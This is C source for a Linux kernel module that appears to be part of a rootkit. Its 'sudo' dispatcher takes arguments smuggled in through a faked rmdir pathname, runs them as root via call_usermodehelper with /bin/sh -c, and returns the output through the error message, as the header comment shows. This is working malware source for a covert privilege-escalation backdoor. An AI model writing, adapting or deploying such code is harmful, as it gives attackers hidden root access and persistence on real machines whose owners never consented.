#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/umh.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../../../../logger/logger.h"
#include "sudo.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

/*
 * Execute command as root and return command response by faking pathname, like:
$ rmdir dza
rmdir: failed to remove 'dza': No such file or directory
$ rmdir randomcanary.sudo.id
rmdir: failed to remove 'uid=0(root) gid=0(root) groups=0(root)': No such file or directory
 */
int sudo(const struct pt_regs *regs, char *argv[], int argc) {
    int ret = 0;

    if (argc == 0) {
        rk_err("[dispatcher:sudo] 'sudo' command requires at least one argument (the command to run).\n");
    } else {
        size_t cmd_len = 0;
        for (int i = 0; i < argc; i++) {
            cmd_len += strlen(argv[i]);
            if (i < argc - 1) {
                cmd_len += 1;
            }
        }
        char *full_cmd_string = kmalloc(cmd_len + 1, GFP_KERNEL);
        if (!full_cmd_string) {
            rk_err("[dispatcher:sudo] Failed to allocate memory for full_cmd_string.\n");
            ret = -ENOMEM;
        } else {
            full_cmd_string[0] = '\0';

            for (int i = 0; i < argc; i++) {
                strlcat(full_cmd_string, argv[i], cmd_len + 1);
                if (i < argc - 1) {
                    strlcat(full_cmd_string, " ", cmd_len + 1);
                }
            }

            rk_info("[dispatcher:sudo] executing as root: '%s'\n", full_cmd_string);

            static char *envp[] = {
                "SHELL=/bin/sh",
                "HOME=/",
                "USER=root",
                "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin",
                "DISPLAY=:0",
                "PWD=/",
                NULL,
            };

            char *root_argv[] = {
                "/bin/sh",
                "-c",
                full_cmd_string,
                NULL,
            };

            ret = call_usermodehelper(
                "/bin/sh",
                root_argv,
                envp,
                UMH_WAIT_EXEC
            );

            if (ret != 0) {
                rk_err("[dispatcher:sudo] call_usermodehelper() failed with error code -> %d\n", ret);
            } else {
                rk_info("[dispatcher:sudo] call_usermodehelper() successfully executed -> %d\n", ret);
            }

            kfree(full_cmd_string);
        }
    }

    return ret;
}